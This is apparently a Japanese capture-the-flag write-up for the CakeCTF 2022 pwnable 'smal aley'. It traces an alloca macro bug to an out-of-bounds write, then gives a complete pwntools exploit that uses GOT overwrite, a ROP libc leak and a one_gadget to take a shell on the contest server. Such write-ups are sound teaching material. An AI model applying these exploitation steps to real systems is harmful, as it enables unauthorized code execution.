---
title: "CakeCTF2022 smal aley (SAMPLE)"
date: 2022-10-19T21:18:00+09:00
draft: false
summary: "CakeCTF 2022においてpwnableのジャンルで出題された問題 smal aleyのwriteup．(サンプル)"
author: "芝海人"
---

## 問題
CakeCTF 2022においてpwnableのジャンルで出題された問題．


**与えられたソースコード**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define ARRAY_SIZE(n) (n * sizeof(long))
#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))

int main() {
  long size, index, *arr;

  printf("size: ");
  if (scanf("%ld", &size) != 1 || size < 0 || size > 5)
    exit(0);

  arr = ARRAY_NEW(size);
  while (1) {
    printf("index: ");
    if (scanf("%ld", &index) != 1 || index < 0 || index >= size)
      exit(0);

    printf("value: ");
    scanf("%ld", &arr[index]);
  }
}

__attribute__((constructor))
void setup(void) {
  alarm(180);
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
}
```

これを見ると， `size <= 5` までの `size` を入力し， `long[size]` の配列を作成することができるプログラムのようである． その後は`alloca` によりスタック上に確保された配列の `index` と `value` を指定し，値を格納することができる．

とりあえず，脆弱性がわからないので，gdbでうろうろすると， `size = 5` のときに， `arr[4]` の値が `size` が格納されている領域が被っていることに気づく．


`size = 5` のときの `index` の入力前
```
gef➤  dps
0x00007fffffffdba0│+0x0000: 0x0000000000401380  ← $rsp
0x00007fffffffdba8│+0x0008: 0x00007ffff7ffe190
0x00007fffffffdbb0│+0x0010: 0x0000000000000003
0x00007fffffffdbb8│+0x0018: 0x00000000004011fa
0x00007fffffffdbc0│+0x0020: 0x0000000000000005  // size = 5
0x00007fffffffdbc8│+0x0028: 0x00000000004010d0
0x00007fffffffdbd0│+0x0030: 0x00007fffffffdba0  // arr = 0x00007fffffffdba0
0x00007fffffffdbd8│+0x0038: 0x5735d60ff465aa00  // canary
0x00007fffffffdbe0│+0x0040: 0x0000000000000000   ← $rbp
```


`size = 5 index = 4 value = 0x255`の入力後
```
0x00007fffffffdba0│+0x0000: 0x0000000000401380  // arr[0]← $rsp
0x00007fffffffdba8│+0x0008: 0x00007ffff7ffe190  // arr[1]
0x00007fffffffdbb0│+0x0010: 0x0000000000000003  // arr[2]
0x00007fffffffdbb8│+0x0018: 0x00000000004011fa  // arr[3]
0x00007fffffffdbc0│+0x0020: 0x00000000000000ff  // arr[4] = 255 size = 255
0x00007fffffffdbc8│+0x0028: 0x0000000000000004  // index = 4
0x00007fffffffdbd0│+0x0030: 0x00007fffffffdba0  // arr = 0x00007fffffffdba0
0x00007fffffffdbd8│+0x0038: 0x5735d60ff465aa00  // canary
0x00007fffffffdbe0│+0x0040: 0x0000000000000000   ← $rbp
```
`value` の入力前後を見てみると， `arr[4]` と `size` のアドレスが同じであるため， `size` を書き換え可能である． このため， `size` を大きな値に書き換えると， `arr` の範囲外参照が可能となる．

ここで，`arr` のアドレスからの `index` に `value` を代入していることから， `arr` の格納されている領域 ( `arr[6]` に該当) に値を書き込みたいアドレスに書き換え， `index = 0` を指定すると，一度限りの AAW が可能である．

あとは，配布されたlibcから one gadegetを探して飛ばせばよい． libcのアドレスがわからないため，ROPから `printf(printf)` をすることで， `printf` のアドレスを漏洩させ，libc leakを考える．

これで早速リターンアドレスを書き換えてROPに持ち込もうとしたら，リターンアドレスがない!!!

びっくりしましたが，よくソースコードを見ると確かにreturnがない． ということでよくソースコードを見ると，Partial RELROなため，GOTが書き換え可能であり，好きなタイミングで呼びだせる `exit` があやしい．

先程説明したAAWを利用することで，GOT Overwriteが可能なため， exit のGOTをROP chainに繋げることで，ROPの発火が可能そう．

GOT OverwriteからROPに繋げる方法として， `call` 命令によりスタックに積まれる `rip` を無視する必要があるので，GOTに `pop ret` のガジェットのアドレスをあげればうまく `rsp` のアドレスに配置したガジェットに繋がる． `pop` の回数を増やすと， `rsp` からのオフセットを増やせるため，結構融通が効く．

`printf(printf)` でlibc leakをしたら，もう一度AAWで `exit` のGOTを one gadgetに書き換えたいので，ROPで `main` に飛ばす．

地味なハマりポイントとして， `main` の頭に飛ばしてしまうと， `push rbp` により，スタックがズレるので注意．気づくまでそこそこ沼った．

`push rbp` の次のアドレスに無事に飛ばせると，先程と同様の操作でAAWで `exit` のGOTを one gadgetに書き換えて `exit` を実行させるとシェルが取れる．


ちなみに，スタックがズレる理由はマクロにあるようで，
```c
#define ARRAY_SIZE(n) (n * sizeof(long))
#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))
```
は
```c
(long*)alloca(n + 1*sizeof(long)))
```
と展開されるため十分な領域が確保されなかったのが問題らしい． （ `size = 5` で32 byteが確保されてるのはアライメントの問題？）

とりあえず，実験のため以下のような簡単なプログラムを書いて， `alloca(8)` と `alloca(9)` のスタックの状態を比較する．

```c
#include<stdio.h>

int main(){

  long *arr = (long*)alloca(8);

  return 0;
}
```
`alloca(8)` のとき
```
0x00007fffffffdbc0│+0x0000: 0x0000000000000000  // arr[0] ← $rsp
0x00007fffffffdbc8│+0x0008: 0x0000000000401050  // arr[1]
0x00007fffffffdbd0│+0x0010: 0x00007fffffffdbc0  // arr
0x00007fffffffdbd8│+0x0018: 0xf95e69f73f01ac00
0x00007fffffffdbe0│+0x0020: 0x0000000000000000   ← $rbp
```

`alloca(9)` のとき
```
0x00007fffffffdbb0│+0x0000: 0x00007ffff7fae2e8  // arr[0] ← $rsp
0x00007fffffffdbb8│+0x0008: 0x0000000000401200  // arr[1]
0x00007fffffffdbc0│+0x0010: 0x0000000000000000  // arr[2]
0x00007fffffffdbc8│+0x0018: 0x0000000000401050  // arr[3]
0x00007fffffffdbd0│+0x0020: 0x00007fffffffdbb0  // arr
000      ← $rcx
0x00007fffffffdbd8│+0x0028: 0xf5befdf7c3de9700
0x00007fffffffdbe0│+0x0030: 0x0000000000000000   ← $rbp
```

これ最初はなんで9byteの領域を確保した瞬間 32byteも確保されたのかなとか考えてたけど， x86-64において， `rsp` は16byteでアラインされることが原因ぽい．

何故9byte目で最初のアラインが発生するのかよくわからないが，その後は25byte目でアラインされることを確認したので， `alloca` により確保された一番高位の8byteは使用されないようになってるぽい．
```
|--------------| <- 元のrsp
|  使用されない  |
|--------------|
|    arr[0]    |
|--------------| <- rsp
|              |
```
つまり，問題では `size = 5` のとき， `alloca(48)` を実行するつもりがマクロのミスにより， `alloca(13)` が実行された結果，アライメントを考慮すると32byteの領域が確保されており， `arr[4]` で範囲外参照が発生して，それが偶然 `size` の変数だった，というのが筋書きだったらしい．なるほど．

## solver
```python
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')

binf = ELF(bin_file)

## nc pwn1.2022.cakectf.com 9002
conn = remote('pwn1.2022.cakectf.com', 9002)
# conn = process(bin_file)
# conn = gdb.debug(bin_file,'''
# b *0x4013e3
# c
# c
# b *0x401090
# ''')

def overwrite(index, value):
    conn.sendlineafter(b'index: ', str(index).encode())
    conn.sendlineafter(b'value: ', str(value).encode())


def AAW(addr, data):
    overwrite(6, addr)
    overwrite(0, data)


## size = 5
conn.sendlineafter(b'size: ', b'5')

## size = 10000
overwrite(4, 10000)

## ROP gadget
exit_got = 0x404038
printf_got = 0x404020
printf_plt =  0x401090
main = 0x4011bb
pop_rdi_ret = 0x4013e3

## ROP chain
overwrite(0, pop_rdi_ret)
overwrite(1, printf_got)
overwrite(2, printf_plt)
overwrite(3, main)

## ignite ROP chain
AAW(exit_got, pop_rdi_ret)
conn.sendlineafter(b'index: ', b'-1')

## libc leak
printf_offset = 0x61c90
printf_libc = unpack(conn.recv(6), 'all')
libc_base = printf_libc - printf_offset
print('libc_base = 0x{:0x}'.format(libc_base))

## size = 5
conn.sendlineafter(b'size: ', b'5')

## size = 10000
overwrite(4, 10000)

## jmp one_gadget
# one_gadget_offset = 0xe3afe
one_gadget_offset = 0xe3b01
one_gadget_libc = libc_base+one_gadget_offset

AAW(exit_got, one_gadget_libc)
conn.sendlineafter(b'index: ', b'-1')


conn.interactive()
```

```
$ python solve.py
[*] '/home/mc4nf/ctf/cakectf/2022/pwn/smal_arey/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn1.2022.cakectf.com on port 9002: Done
libc_base = 0x7faa43604000
[*] Switching to interactive mode
$ ls
chall
flag-c665afc224a93b0c2e4cf82abfedf180.txt
$ cat flag*
CakeCTF{PRE01-C. Use parentheses within macros around parameter names}
```
### CakeCTF{PRE01-C. Use parentheses within macros around parameter names}
